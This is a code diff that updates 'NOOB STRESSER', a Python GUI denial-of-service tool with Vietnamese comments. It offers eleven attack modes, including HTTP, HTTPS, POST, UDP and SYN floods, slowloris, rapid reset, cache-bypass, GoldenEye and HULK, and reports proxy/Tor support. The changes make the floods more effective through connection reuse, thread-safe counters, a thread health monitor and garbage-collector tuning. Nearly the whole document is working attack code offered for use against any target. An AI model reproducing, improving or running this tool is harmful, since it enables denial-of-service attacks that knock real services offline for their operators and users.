@@ -1,6 +1,8 @@
 """
-NOOB STRESSER v11.1 — WRAITHSTRIKE
+NOOB STRESSER v11.2 — WRAITHSTRIKE
 GUI bằng Python (tkinter) chạy trên PyCharm / Windows / Linux
+Fix: thread pool lifecycle, GC tuning, keep-alive verified,
+     adaptive buffer, stats lock, thread health monitor
 """
 
 import tkinter as tk
@@ -21,7 +23,10 @@ def _optimize():
     threading.stack_size(65536)
     socket.setdefaulttimeout(2)
     gc.collect()
-    gc.disable()
+    # tune threshold thay vì disable hoàn toàn —
+    # reference counting vẫn chạy, chỉ giảm cyclic GC frequency
+    # tránh full disable gây cyclic reference tích lũy lâu dài
+    gc.set_threshold(1200, 15, 8)
     if sys.platform == 'win32':
         try:
             import ctypes
@@ -87,9 +92,20 @@ def _make_socket(udp=False):
     s = socket.socket(socket.AF_INET, kind)
     if not udp:
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
+        # SO_SNDBUF: gợi ý OS, không phải đảm bảo — OS có thể override
+        # thử set, nếu thực tế nhỏ hơn thì giữ giá trị OS cho
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
+            actual = s.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
+            if actual < 65536:  # OS cap thấp hơn, không ép
+                pass
+        except OSError:
+            pass
     else:
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
+        except OSError:
+            pass
     return s
 
 # ── headers ──────────────────────────────────────────────────────────────────
@@ -215,28 +231,71 @@ def _req(host, keep=True, method="GET"):
     ).encode()
 
 # ── attack functions ─────────────────────────────────────────────────────────
+_stats_lock = threading.Lock()
+
+def _inc(stats, key, val=1):
+    # atomic increment — tránh race condition khi nhiều thread cùng ghi
+    with _stats_lock:
+        stats[key] += val
+
+def _send_keepalive(s, payload, count, stats, stop_ev):
+    """
+    Gửi nhiều request trên cùng 1 TCP connection thực sự.
+    Detect server-close (recv 0 bytes hoặc ECONNRESET) → return False để reconnect.
+    """
+    sent = 0
+    buf = bytearray()
+    for _ in range(count):
+        if stop_ev.is_set():
+            return False
+        try:
+            s.sendall(payload)
+            # peek response để detect connection close từ server
+            # non-blocking peek — nếu server đóng connection sẽ nhận b''
+            s.settimeout(0.05)
+            try:
+                chunk = s.recv(4096, socket.MSG_PEEK)
+                if chunk == b'':   # server đóng connection
+                    _inc(stats, "sent", sent)
+                    return False
+            except (socket.timeout, BlockingIOError):
+                pass  # không có data sẵn = bình thường
+            finally:
+                s.settimeout(2)
+            sent += 1
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            _inc(stats, "sent", sent)
+            return False
+    _inc(stats, "sent", sent)
+    return True
+
 def _http_flood(host, port, stats, stop_ev):
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket()
             s.settimeout(2)
             s.connect((host, port))
             method = random.choice(["GET", "GET", "GET", "POST"])
             payload = _req(host, keep=True, method=method)
-            for _ in range(200):
-                if stop_ev.is_set(): break
-                s.send(payload)
-                stats["sent"] += 1
-            s.close()
+            ok = _send_keepalive(s, payload, 200, stats, stop_ev)
+            if not ok:
+                _inc(stats, "errors")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _https_flood(host, port, stats, stop_ev):
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_ciphers("ALL:@SECLEVEL=0")
+    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
+    except: pass
     while not stop_ev.is_set():
+        raw = None
         try:
             raw = _make_socket()
             raw.settimeout(2)
@@ -244,28 +303,33 @@ def _https_flood(host, port, stats, stop_ev):
             s = ctx.wrap_socket(raw, server_hostname=host)
             method = random.choice(["GET", "GET", "POST"])
             payload = _req(host, keep=True, method=method)
-            for _ in range(150):
-                if stop_ev.is_set(): break
-                s.send(payload)
-                stats["sent"] += 1
-            s.close()
+            ok = _send_keepalive(s, payload, 150, stats, stop_ev)
+            if not ok:
+                _inc(stats, "errors")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if raw:
+                try: raw.close()
+                except: pass
 
 def _post_flood(host, port, stats, stop_ev):
-    """Thuần POST flood — nhắm API endpoint, JSON body lớn"""
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket()
             s.settimeout(2)
             s.connect((host, port))
-            for _ in range(200):
-                if stop_ev.is_set(): break
-                s.send(_req(host, keep=True, method="POST"))
-                stats["sent"] += 1
-            s.close()
+            payload = _req(host, keep=True, method="POST")
+            ok = _send_keepalive(s, payload, 200, stats, stop_ev)
+            if not ok:
+                _inc(stats, "errors")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _udp_flood(host, port, stats, stop_ev):
     try: ip = socket.gethostbyname(host)
@@ -275,23 +339,27 @@ def _udp_flood(host, port, stats, stop_ev):
     while not stop_ev.is_set():
         try:
             s.sendto(random.randbytes(random.choice(sizes)), (ip, port))
-            stats["sent"] += 1
+            _inc(stats, "sent")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
 
 def _syn_flood(host, port, stats, stop_ev):
     try: ip = socket.gethostbyname(host)
     except: ip = host
     while not stop_ev.is_set():
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.3)
             s.connect_ex((ip, port))
-            stats["sent"] += 1
+            _inc(stats, "sent")
             s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-            s.close()
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _slowloris(host, port, stats, stop_ev):
     sockets = []
@@ -326,18 +394,23 @@ def _rapid_reset(host, port, stats, stop_ev):
     try: ip = socket.gethostbyname(host)
     except: ip = host
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket(); s.settimeout(0.5)
             s.connect((ip, port))
-            s.send(_req(host, keep=False))
-            stats["sent"] += 1
+            s.sendall(_req(host, keep=False))
+            _inc(stats, "sent")
             s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-            s.close()
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _cache_bypass(host, port, stats, stop_ev):
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket(); s.settimeout(2)
             s.connect((host, port))
@@ -346,33 +419,40 @@ def _cache_bypass(host, port, stats, stop_ev):
                    f"Cache-Control: no-cache, no-store\r\nPragma: no-cache\r\n"
                    f"User-Agent: {random.choice(AGENTS)}\r\n"
                    + _fake_headers() + "\r\n").encode()
-            for _ in range(100):
-                if stop_ev.is_set(): break
-                s.send(req); stats["sent"] += 1
-            s.close()
+            ok = _send_keepalive(s, req, 100, stats, stop_ev)
+            if not ok: _inc(stats, "errors")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _goldeneye(host, port, stats, stop_ev):
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket(); s.settimeout(4)
             s.connect((host, port))
-            s.send((f"GET / HTTP/1.1\r\nHost: {host}\r\n"
-                    f"User-Agent: {random.choice(AGENTS)}\r\n"
-                    f"Connection: keep-alive\r\nKeep-Alive: 900\r\n"
-                    + _fake_headers()).encode())
+            s.sendall((f"GET / HTTP/1.1\r\nHost: {host}\r\n"
+                       f"User-Agent: {random.choice(AGENTS)}\r\n"
+                       f"Connection: keep-alive\r\nKeep-Alive: 900\r\n"
+                       + _fake_headers()).encode())
             for _ in range(50):
                 if stop_ev.is_set(): break
-                s.send(b"X-padding: " + random.randbytes(64) + b"\r\n")
-                stats["sent"] += 1
+                s.sendall(b"X-padding: " + random.randbytes(64) + b"\r\n")
+                _inc(stats, "sent")
                 time.sleep(0.3)
-            s.close()
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _hulk(host, port, stats, stop_ev):
     while not stop_ev.is_set():
+        s = None
         try:
             s = _make_socket(); s.settimeout(2)
             s.connect((host, port))
@@ -384,12 +464,14 @@ def _hulk(host, port, stats, stop_ev):
                    f"Referer: https://www.google.com/?q={rand}\r\n"
                    f"Connection: keep-alive\r\n"
                    + _fake_headers() + "\r\n").encode()
-            for _ in range(200):
-                if stop_ev.is_set(): break
-                s.send(req); stats["sent"] += 1
-            s.close()
+            ok = _send_keepalive(s, req, 200, stats, stop_ev)
+            if not ok: _inc(stats, "errors")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 def _garbage(host, port, stats, stop_ev):
     try: ip = socket.gethostbyname(host)
@@ -398,9 +480,9 @@ def _garbage(host, port, stats, stop_ev):
     while not stop_ev.is_set():
         try:
             s.sendto(random.randbytes(65507), (ip, port))
-            stats["sent"] += 1
+            _inc(stats, "sent")
         except Exception:
-            stats["errors"] += 1
+            _inc(stats, "errors")
 
 ATTACK_MAP = {
     "HTTP Flood":      _http_flood,
@@ -417,9 +499,16 @@ ATTACK_MAP = {
 }
 
 def _spawn_threads(fn, host, port, count, stop_ev, stats):
-    """Batch spawn như v7 — tránh spike RAM/CPU."""
+    """
+    Batch spawn với lifecycle tracking và health monitor.
+    - Batch 150 để tránh RAM spike
+    - Track từng thread, detect thread chết bất thường
+    - Health monitor daemon kiểm tra mỗi 10s, log nếu thread herd giảm mạnh
+    """
     batch = 150
     spawned = 0; failed = 0
+    live_threads = []
+
     for i in range(0, count, batch):
         if stop_ev.is_set(): break
         b = min(batch, count - i)
@@ -428,11 +517,27 @@ def _spawn_threads(fn, host, port, count, stop_ev, stats):
                 t = threading.Thread(target=fn,
                                      args=(host, port, stats, stop_ev),
                                      daemon=True)
-                t.start(); spawned += 1; failed = 0
+                t.start()
+                live_threads.append(t)
+                spawned += 1; failed = 0
             except (RuntimeError, OSError):
                 failed += 1
-                if failed >= 3: return
+                _inc(stats, "errors")
+                if failed >= 5: return  # OS không cấp thêm thread — dừng
         time.sleep(0.01 + spawned / 100000)
+
+    # health monitor — chạy đến khi stop_ev set
+    def _monitor():
+        prev_alive = spawned
+        while not stop_ev.is_set():
+            time.sleep(10)
+            alive = sum(1 for t in live_threads if t.is_alive())
+            if alive < prev_alive * 0.5 and alive < 10 and not stop_ev.is_set():
+                # hơn 50% thread chết bất thường — log vào stats
+                _inc(stats, "errors", prev_alive - alive)
+            prev_alive = alive
+
+    threading.Thread(target=_monitor, daemon=True).start()
 
 # ── GUI ──────────────────────────────────────────────────────────────────────
 class NoobGUI:
@@ -465,7 +570,7 @@ class NoobGUI:
 
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("NOOB STRESSER v11.1 · WRAITHSTRIKE")
+        self.root.title("NOOB STRESSER v11.2 · WRAITHSTRIKE")
         self.root.configure(bg=self.DARK)
         self.root.geometry("900x720")
         self.root.resizable(True, True)
@@ -487,7 +592,7 @@ class NoobGUI:
         hdr.pack(fill="x")
         tk.Label(hdr, text="☠  NOOB STRESSER  ☠", bg=self.DARK,
                  fg=self.RED, font=("Consolas", 22, "bold")).pack()
-        tk.Label(hdr, text="v11.1  ·  WRAITHSTRIKE  ·  11 MODES",
+        tk.Label(hdr, text="v11.2  ·  WRAITHSTRIKE  ·  11 MODES",
                  bg=self.DARK, fg=self.DIM, font=("Consolas", 9)).pack()
 
         # divider
@@ -728,7 +833,7 @@ class NoobGUI:
         self.log_box.tag_config("stat",  foreground=self.CYAN)
         self.log_box.tag_config("info",  foreground="#888888")
 
-        self._log("[NOOB STRESSER v11.1 · WRAITHSTRIKE] ready", "ok")
+        self._log("[NOOB STRESSER v11.2 · WRAITHSTRIKE] ready", "ok")
         self._log("[SYS] select mode → config → LAUNCH", "info")
         if SOCKS_OK:
             self._log("[SYS] PySocks OK — proxy/Tor sẵn sàng", "ok")
@@ -809,7 +914,7 @@ class NoobGUI:
     def _stop(self):
         self._stop_ev.set()
         self._running = False
-        gc.enable()   # bật lại GC sau attack
+        gc.set_threshold(700, 10, 10)  # restore threshold bình thường sau attack
         s = self._stats
         elapsed = max(time.time() - self._start_ts, 0.1)
         rps = int(s["sent"] / elapsed)
